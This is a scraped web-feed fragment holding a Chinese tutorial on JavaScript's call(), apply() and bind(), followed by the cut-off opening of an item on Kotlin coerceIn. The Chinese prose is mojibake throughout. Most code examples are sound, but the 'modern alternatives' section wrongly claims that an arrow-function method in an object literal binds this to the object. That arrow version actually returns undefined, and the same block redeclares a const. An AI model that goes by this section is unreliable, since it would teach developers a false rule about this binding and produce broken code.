                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>call()ã€apply()ã€bind()</code>Â éƒ½æ˜¯ JavaScript ä¸­ç”¨äº<strong>æ˜¾å¼ç»‘å®šå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆthis å€¼ï¼‰</strong> Â çš„æ–¹æ³•ï¼Œä½†å®ƒä»¬åœ¨å‚æ•°ä¼ é€’å’Œè°ƒç”¨æ—¶æœºä¸Šæœ‰é‡è¦åŒºåˆ«ã€‚</p>
<h2 data-id="heading-0">ğŸ“ŒÂ <strong>æ ¸å¿ƒåŒºåˆ«æ€»ç»“</strong></h2>





























<table><thead><tr><th>æ–¹æ³•</th><th>è°ƒç”¨æ—¶æœº</th><th>å‚æ•°å½¢å¼</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td><strong>call()</strong></td><td><strong>ç«‹å³æ‰§è¡Œ</strong></td><td>å‚æ•°åˆ—è¡¨ï¼ˆé€ä¸ªä¼ é€’ï¼‰</td><td>å‡½æ•°çš„æ‰§è¡Œç»“æœ</td></tr><tr><td><strong>apply()</strong></td><td><strong>ç«‹å³æ‰§è¡Œ</strong></td><td>å‚æ•°æ•°ç»„ï¼ˆå•ä¸ªæ•°ç»„ï¼‰</td><td>å‡½æ•°çš„æ‰§è¡Œç»“æœ</td></tr><tr><td><strong>bind()</strong></td><td><strong>ä¸ç«‹å³æ‰§è¡Œ</strong>ï¼Œè¿”å›æ–°å‡½æ•°</td><td>å‚æ•°åˆ—è¡¨ï¼ˆå¯éƒ¨åˆ†ä¼ å…¥ï¼‰</td><td>è¿”å›ä¸€ä¸ªæ–°å‡½æ•°ï¼ˆç»‘å®šå‡½æ•°ï¼‰</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">ğŸ”Â <strong>è¯¦ç»†è§£æ</strong></h2>
<h3 data-id="heading-2"><strong>1. call()</strong></h3>
<pre><code class="hljs language-js" lang="js">func.<span class="hljs-title function_">call</span>(thisArg, arg1, arg2, ...)
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>ç«‹å³è°ƒç”¨</strong>å‡½æ•°</li>
<li>å‚æ•°ä»¥<strong>é€—å·åˆ†éš”çš„åˆ—è¡¨</strong>ä¼ é€’</li>
<li>é€‚åˆå‚æ•°ä¸ªæ•°å›ºå®šçš„æƒ…å†µ</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params">greeting, punctuation</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, æˆ‘æ˜¯<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span><span class="hljs-subst">${punctuation}</span>`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span> };

introduce.<span class="hljs-title function_">call</span>(person, <span class="hljs-string">'ä½ å¥½'</span>, <span class="hljs-string">'!'</span>);
<span class="hljs-comment">// è¾“å‡ºï¼šä½ å¥½, æˆ‘æ˜¯å¼ ä¸‰!</span>
</code></pre>
<h3 data-id="heading-3"><strong>2. apply()</strong></h3>
<pre><code class="hljs language-js" lang="js">func.<span class="hljs-title function_">apply</span>(thisArg, [argsArray])
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>ç«‹å³è°ƒç”¨</strong>å‡½æ•°</li>
<li>å‚æ•°ä»¥<strong>æ•°ç»„</strong>å½¢å¼ä¼ é€’ï¼ˆæˆ–ç±»æ•°ç»„å¯¹è±¡ï¼‰</li>
<li>é€‚åˆå‚æ•°ä¸ªæ•°ä¸ç¡®å®šï¼Œæˆ–å·²æœ‰æ•°ç»„çš„æƒ…å†µ</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params">greeting, punctuation</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, æˆ‘æ˜¯<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span><span class="hljs-subst">${punctuation}</span>`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'æå››'</span> };

introduce.<span class="hljs-title function_">apply</span>(person, [<span class="hljs-string">'Hello'</span>, <span class="hljs-string">'!!!'</span>]);
<span class="hljs-comment">// è¾“å‡ºï¼šHello, æˆ‘æ˜¯æå››!!!</span>

<span class="hljs-comment">// å®é™…åº”ç”¨ï¼šæ•°ç»„æ±‚æœ€å¤§å€¼</span>
<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>];
<span class="hljs-keyword">const</span> max = <span class="hljs-title class_">Math</span>.<span class="hljs-property">max</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-literal">null</span>, numbers); <span class="hljs-comment">// 7</span>
</code></pre>
<h3 data-id="heading-4"><strong>3. bind()</strong></h3>
<pre><code class="hljs language-js" lang="js">func.<span class="hljs-title function_">bind</span>(thisArg, arg1, arg2, ...)
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>ä¸ç«‹å³è°ƒç”¨</strong>ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–°å‡½æ•°ï¼ˆç»‘å®šå‡½æ•°ï¼‰</li>
<li>è¿”å›çš„å‡½æ•°å¯<strong>å¤šæ¬¡è°ƒç”¨</strong>ï¼Œä¸”æ¯æ¬¡Â <code>this</code>Â éƒ½æŒ‡å‘ç»‘å®šçš„å€¼</li>
<li>æ”¯æŒ<strong>å‚æ•°é¢„è®¾</strong>ï¼ˆæŸ¯é‡ŒåŒ–ï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params">greeting, punctuation</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, æˆ‘æ˜¯<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span><span class="hljs-subst">${punctuation}</span>`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'ç‹äº”'</span> };

<span class="hljs-comment">// åˆ›å»ºç»‘å®šå‡½æ•°ï¼Œé¢„è®¾éƒ¨åˆ†å‚æ•°</span>
<span class="hljs-keyword">const</span> boundFunc = introduce.<span class="hljs-title function_">bind</span>(person, <span class="hljs-string">'Hi'</span>);
<span class="hljs-title function_">boundFunc</span>(<span class="hljs-string">'!!!'</span>);      <span class="hljs-comment">// è¾“å‡ºï¼šHi, æˆ‘æ˜¯ç‹äº”!!!</span>
<span class="hljs-title function_">boundFunc</span>(<span class="hljs-string">'?'</span>);        <span class="hljs-comment">// è¾“å‡ºï¼šHi, æˆ‘æ˜¯ç‹äº”?</span>

<span class="hljs-comment">// å®é™…åº”ç”¨ï¼šäº‹ä»¶å¤„ç†å‡½æ•°</span>
<span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'button'</span>);
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">textContent</span>); <span class="hljs-comment">// this æŒ‡å‘ button</span>
}.<span class="hljs-title function_">bind</span>(button));
</code></pre>
<h2 data-id="heading-5">ğŸ¯Â <strong>å…³é”®å¯¹æ¯”</strong></h2>
<h3 data-id="heading-6"><strong>å‚æ•°ä¼ é€’æ–¹å¼</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b, c</span>) {
  <span class="hljs-keyword">return</span> a + b + c;
}

<span class="hljs-keyword">const</span> obj = {};

<span class="hljs-comment">// callï¼šé€ä¸ªä¼ é€’å‚æ•°</span>
sum.<span class="hljs-title function_">call</span>(obj, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);    <span class="hljs-comment">// 6</span>

<span class="hljs-comment">// applyï¼šæ•°ç»„ä¼ é€’</span>
sum.<span class="hljs-title function_">apply</span>(obj, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// 6</span>

<span class="hljs-comment">// bindï¼šå‚æ•°é¢„è®¾ + åç»­ä¼ é€’</span>
<span class="hljs-keyword">const</span> boundSum = sum.<span class="hljs-title function_">bind</span>(obj, <span class="hljs-number">1</span>);
<span class="hljs-title function_">boundSum</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);            <span class="hljs-comment">// 6</span>
<span class="hljs-title function_">boundSum</span>(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>);            <span class="hljs-comment">// 10 (1 + 4 + 5)</span>
</code></pre>
<h3 data-id="heading-7"><strong>æ‰§è¡Œæ—¶æœº</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">value</span>: <span class="hljs-number">10</span> };

<span class="hljs-keyword">function</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>);
}

<span class="hljs-comment">// call å’Œ apply ç«‹å³æ‰§è¡Œ</span>
show.<span class="hljs-title function_">call</span>(obj);    <span class="hljs-comment">// ç«‹å³è¾“å‡ºï¼š10</span>

<span class="hljs-comment">// bind è¿”å›å‡½æ•°ï¼Œç¨åæ‰§è¡Œ</span>
<span class="hljs-keyword">const</span> boundShow = show.<span class="hljs-title function_">bind</span>(obj);
<span class="hljs-title function_">boundShow</span>();       <span class="hljs-comment">// ç¨åè°ƒç”¨ï¼Œè¾“å‡ºï¼š10</span>
</code></pre>
<h2 data-id="heading-8">ğŸ’¡Â <strong>å®é™…åº”ç”¨åœºæ™¯</strong></h2>
<h3 data-id="heading-9"><strong>1. å€Ÿç”¨æ–¹æ³•</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å€Ÿç”¨æ•°ç»„æ–¹æ³•å¤„ç†ç±»æ•°ç»„å¯¹è±¡</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sumArguments</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// arguments æ˜¯ç±»æ•°ç»„ï¼Œæ²¡æœ‰ reduce æ–¹æ³•</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">reduce</span>.<span class="hljs-title function_">call</span>(
    <span class="hljs-variable language_">arguments</span>, 
    <span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, 
    <span class="hljs-number">0</span>
  );
}
<span class="hljs-title function_">sumArguments</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// 10</span>
</code></pre>
<h3 data-id="heading-10"><strong>2. æ„é€ å‡½æ•°ç»§æ‰¿</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// å€Ÿç”¨çˆ¶ç±»æ„é€ å‡½æ•°</span>
  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
</code></pre>
<h3 data-id="heading-11"><strong>3. æŸ¯é‡ŒåŒ–ï¼ˆéƒ¨åˆ†åº”ç”¨å‡½æ•°ï¼‰</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">a, b, c</span>) {
  <span class="hljs-keyword">return</span> a * b * c;
}

<span class="hljs-comment">// é¢„è®¾å‰ä¸¤ä¸ªå‚æ•°</span>
<span class="hljs-keyword">const</span> double = multiply.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);
<span class="hljs-title function_">double</span>(<span class="hljs-number">4</span>); <span class="hljs-comment">// 24 (2 * 3 * 4)</span>
<span class="hljs-title function_">double</span>(<span class="hljs-number">5</span>); <span class="hljs-comment">// 30 (2 * 3 * 5)</span>
</code></pre>
<h3 data-id="heading-12"><strong>4. React/Vue ä¸­çš„äº‹ä»¶å¤„ç†</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// React ç±»ç»„ä»¶ä¸­</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Button</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">super</span>(props);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);
  }
  
  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>); <span class="hljs-comment">// this æ­£ç¡®æŒ‡å‘ç»„ä»¶å®ä¾‹</span>
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{this.handleClick}</span>&gt;</span>ç‚¹å‡»<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
  }
}
</code></pre>
<h2 data-id="heading-13">âš ï¸Â <strong>æ³¨æ„äº‹é¡¹</strong></h2>
<ol>
<li><strong>ç®­å¤´å‡½æ•°æ— è‡ªå·±çš„ this</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">func</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>);
func.<span class="hljs-title function_">call</span>({<span class="hljs-attr">value</span>: <span class="hljs-number">1</span>}); <span class="hljs-comment">// this ä¸ä¼šæ”¹å˜ï¼ŒæŒ‡å‘å®šä¹‰æ—¶çš„ä¸Šä¸‹æ–‡</span>
</code></pre>
<ol start="2">
<li><strong>å‚æ•°ä¸º null/undefined</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// éä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œnull/undefined ä¼šè¢«æ›¿æ¢ä¸ºå…¨å±€å¯¹è±¡ï¼ˆæµè§ˆå™¨ä¸­ä¸º windowï¼‰</span>
<span class="hljs-comment">// ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œä¿æŒä¸º null/undefined</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); }
test.<span class="hljs-title function_">call</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// éä¸¥æ ¼æ¨¡å¼ï¼šwindowï¼Œä¸¥æ ¼æ¨¡å¼ï¼šnull</span>
</code></pre>
<ol start="3">
<li><strong>æ€§èƒ½è€ƒè™‘</strong>
<ul>
<li><code>bind()</code>Â æ¯æ¬¡è¿”å›æ–°å‡½æ•°ï¼Œé¢‘ç¹ä½¿ç”¨å¯èƒ½äº§ç”Ÿå¤§é‡å‡½æ•°å¯¹è±¡</li>
<li>ç¼“å­˜ç»‘å®šå‡½æ•°å¯ä¼˜åŒ–æ€§èƒ½</li>
</ul>
</li>
</ol>
<h2 data-id="heading-14">ğŸ†šÂ <strong>ç°ä»£æ›¿ä»£æ–¹æ¡ˆ</strong></h2>
<h3 data-id="heading-15"><strong>å±•å¼€è¿ç®—ç¬¦æ›¿ä»£ apply</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä»¥å‰</span>
<span class="hljs-title class_">Math</span>.<span class="hljs-property">max</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-literal">null</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);

<span class="hljs-comment">// ç°åœ¨</span>
<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(...[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);  <span class="hljs-comment">// å±•å¼€è¿ç®—ç¬¦</span>
</code></pre>
<h3 data-id="heading-16"><strong>ç®­å¤´å‡½æ•°é¿å… this ç»‘å®š</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä»¥å‰éœ€è¦ bind</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">value</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">getValue</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
  }.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>)
};

<span class="hljs-comment">// ç°åœ¨å¯ç”¨ç®­å¤´å‡½æ•°</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">value</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">getValue</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>  <span class="hljs-comment">// this è‡ªåŠ¨ç»‘å®šåˆ°å¤–å±‚</span>
};
</code></pre>
<h2 data-id="heading-17">ğŸ“Â <strong>æ€»ç»“å£è¯€</strong></h2>
<ul>
<li><strong>call</strong>ï¼šç«‹å³è°ƒç”¨ï¼Œå‚æ•°<strong>ä¸€ä¸ªä¸€ä¸ª</strong>ä¼ </li>
<li><strong>apply</strong>ï¼šç«‹å³è°ƒç”¨ï¼Œå‚æ•°<strong>æ•°ç»„</strong>ä¸€èµ·ä¼ </li>
<li><strong>bind</strong>ï¼šä¸è°ƒç”¨ï¼Œè¿”å›æ–°å‡½æ•°ï¼Œå¯<strong>é¢„è®¾å‚æ•°</strong></li>
</ul>
<p>ç†è§£è¿™ä¸‰ä¸ªæ–¹æ³•å¯¹äºæŒæ¡ JavaScript çš„Â <code>this</code>Â æœºåˆ¶å’Œå‡½æ•°å¼ç¼–ç¨‹è‡³å…³é‡è¦ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œæ ¹æ®éœ€æ±‚çµæ´»é€‰æ‹©åˆé€‚çš„æ–¹æ³•ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin coerceIn ä½¿ç”¨è¯¦è§£]]></title>    <link>https://juejin.cn/post/7602488966609715238</link>    <guid>https://juejin.cn/post/7602488966609715238</guid>    <pubDate>2026-02-03T12:26:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488966609715238" data-draft-id="7602463463105495086" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin coerceIn ä½¿ç”¨è¯¦è§£"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-03T12:26:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿ƒæºxinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin coerceIn ä½¿ç”¨è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿ƒæºxinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:26:24.000Z" title="Tue Feb 03 2026 12:26:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body 